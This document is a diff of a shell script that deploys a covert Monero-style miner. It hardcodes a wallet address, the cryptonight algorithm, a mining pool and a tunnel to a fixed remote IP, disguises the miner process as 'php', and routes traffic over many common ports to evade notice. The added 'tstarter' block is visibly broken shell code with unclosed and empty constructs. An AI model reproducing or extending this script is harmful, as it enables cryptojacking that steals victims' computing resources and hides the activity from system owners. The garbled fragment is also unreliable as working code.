@@ -61,8 +61,25 @@ fi
 
 ## glibc not needed on standalone
 ## tnl
+cat <<TSTARTER > tstarter
+checks() {
+         pid="$(pgrep -xf "php -C php.ini")"
+         ## lsof or netstat require /proc so not reliable
+         port="$(nc)
+}
+start(){
+    ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS} &
+}
+for p in "$TNL_PLIST"; do
+    start
+    while [ ]; do
+    done
+done
+
+TSTARTER
 function setup_tnl(){
     TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
+    TNL_PLIST="80 443 20 21 465 993 995 110 123 2703 3036 8080 8081 8082 9000 10000"
     TNL_CFG=${TNL_CFG:-gst.json}
     TNL_PATH=${TNL_PATH:-$(/usr/bin/which gst)}
     TNL_MASK=${TNL_MASK:-php}
@@ -84,6 +101,7 @@ function setup_tnl(){
         TNL_TARGET=${TNL_TARGET:-pool.supportaeon.com:3333}
     fi
     export TNL_REMOTE="$TNL_REMOTE" \
+           TNL_LISTEN=${TNL_LISTEN:-8080} \
            TNL_PROTO \
            TNL_TARGET
     envsubst -no-empty -i ${TNL_CFG_MASK}.tpl -o ${TNL_CFG_MASK}
@@ -157,7 +175,7 @@ export \
 ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 AL=${AL:-cryptonight} \
-ENDPOINT=${ENDPONT:-127.0.0.1:8080}
+ENDPOINT=${ENDPONT:-127.0.0.1:${TNL_LISTEN}}
 
 ## set vars used by pausd daemon in tmux and envsubst
 for v in $(builtin compgen -A variable | grep ^PAUSD); do
